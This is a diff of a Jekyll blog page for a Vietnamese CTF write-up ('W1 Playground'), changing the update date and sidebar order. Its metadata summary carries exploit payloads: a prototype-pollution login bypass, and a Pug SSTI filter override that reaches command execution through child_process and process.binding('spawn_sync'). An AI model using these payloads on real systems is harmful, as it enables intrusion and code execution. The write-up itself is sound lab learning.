@@ -43,7 +43,7 @@
 <meta property="twitter:title" content="W1 Playground Writeup" />
 <meta name="twitter:site" content="@anzuukino" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-02-27T23:00:00+07:00","datePublished":"2024-02-27T23:00:00+07:00","description":"Bài 1: easy login Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin” Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập Chức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkey Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[&quot;__proto__&quot;][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đó Payload Có jwtkey rồi thì vào admin để lấy flag thôi Flag : W1{REDACTED} Bài 2: render4free Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI Sau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code js Bây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta - global.replace_bad_char = str_to_replace =&gt; str_to_replace Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval - global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace) Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào Payload require(&#39;child_process&#39;).exec(&#39;ping hacked.sv&#39;) Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;ls&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Ngon vậy là có thể thực hiện lệnh ls Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag Payload: 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;/read_flag&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Flag: W1{REDACTED} Bài 3: pwncloud","headline":"W1 Playground Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/W1Playground/"},"url":"http://localhost:4000/posts/W1Playground/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-28T13:03:11+07:00","datePublished":"2024-02-27T23:00:00+07:00","description":"Bài 1: easy login Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin” Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhập Chức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkey Sau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[&quot;__proto__&quot;][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đó Payload Có jwtkey rồi thì vào admin để lấy flag thôi Flag : W1{REDACTED} Bài 2: render4free Phân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vào Sau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTI Sau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code js Bây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta - global.replace_bad_char = str_to_replace =&gt; str_to_replace Tiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval - global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace) Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nào Payload require(&#39;child_process&#39;).exec(&#39;ping hacked.sv&#39;) Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng import Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về null Oat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;ls&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Ngon vậy là có thể thực hiện lệnh ls Để ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flag Payload: 1 2 3 4 5 6 7 8 process.binding(&#39;spawn_sync&#39;).spawn({ file: &#39;/read_flag&#39;, args: [&#39;&#39;], stdio: [ { type: &#39;pipe&#39;, readable: true, writable: false }, { type: &#39;pipe&#39;, readable: false, writable: true }, { type: &#39;pipe&#39;, readable: false, writable: true } ]}).output.toString() Flag: W1{REDACTED} Bài 3: pwncloud","headline":"W1 Playground Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/W1Playground/"},"url":"http://localhost:4000/posts/W1Playground/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -1542,6 +1542,29 @@
 
       <!-- lastmod date -->
       
+        <span>
+          Updated
+          <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1711605791"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Mar 28, 2024
+</time>
+
+        </span>
+      
 
       
 
@@ -1836,6 +1859,13 @@ Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả v�
         
         
         <li class="text-truncate lh-lg">
+          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
           <a href="/posts/PicoCTF2024/">PicoCTF 2024</a>
         </li>
       
@@ -1844,13 +1874,6 @@ Nhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả v�
         
         <li class="text-truncate lh-lg">
           <a href="/posts/Wannagame-Freshman/">Wannagame Freshman CTF writeup</a>
-        </li>
-      
-        
-        
-        
-        <li class="text-truncate lh-lg">
-          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
         </li>
       
         
